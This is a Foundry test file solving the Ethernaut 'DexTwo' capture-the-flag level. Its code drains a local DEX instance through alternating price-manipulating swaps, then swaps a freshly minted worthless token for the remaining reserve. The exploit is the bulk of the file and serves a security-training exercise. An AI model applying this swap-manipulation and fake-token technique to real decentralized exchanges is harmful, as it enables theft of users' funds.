// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/DexTwo/DexTwoFactory.sol";
import "../src/Ethernaut.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract DexTwoTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testMyDexTwoHack() public {
        /**
         *
         * Factory setup *
         *
         */
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));
        /**
         *
         *    Attack     *
         *
         */
        HackToken hackToken = new HackToken("", "", 100);
        address token1 = ethernautDexTwo.token1();
        address token2 = ethernautDexTwo.token2();
        address from;
        address to;
        //ethernautDexTwo.add_liquidity(token2, 10);
        SwappableTokenTwo(token2).transfer(levelAddress, 10);
        ethernautDexTwo.approve(levelAddress, type(uint256).max);
        for (uint256 i = 0; i < 100; i++) {
            if (i % 2 == 0) {
                from = token1;
                to = token2;
            } else {
                from = token2;
                to = token1;
            }

            ethernautDexTwo.swap(from, to, SwappableTokenTwo(from).balanceOf(player)); //10*110/100 -> 11 - 0: 99:110
                // 11*110/99 -> 0 - 12: 110 - 98
            if (SwappableTokenTwo(to).balanceOf(player) >= SwappableTokenTwo(to).balanceOf(levelAddress)) {
                break;
            }
        }
        if (from == token1) {
            from = token2;
            to = token1;
        } else {
            from = token1;
            to = token2;
        }
        console.log(SwappableTokenTwo(token1).balanceOf(player));
        console.log(SwappableTokenTwo(token2).balanceOf(player));
        ethernautDexTwo.swap(from, to, SwappableTokenTwo(from).balanceOf(levelAddress));
        console.log(SwappableTokenTwo(token1).balanceOf(player));
        console.log(SwappableTokenTwo(token2).balanceOf(player));
        hackToken.transfer(levelAddress, 1);
        hackToken.approve(levelAddress, type(uint256).max);
        ethernautDexTwo.swap(address(hackToken), from, 1);
        console.log(SwappableTokenTwo(token1).balanceOf(player));
        console.log(SwappableTokenTwo(token2).balanceOf(player));

        /**
         *
         * Level Submission*
         *
         */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract HackToken is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}
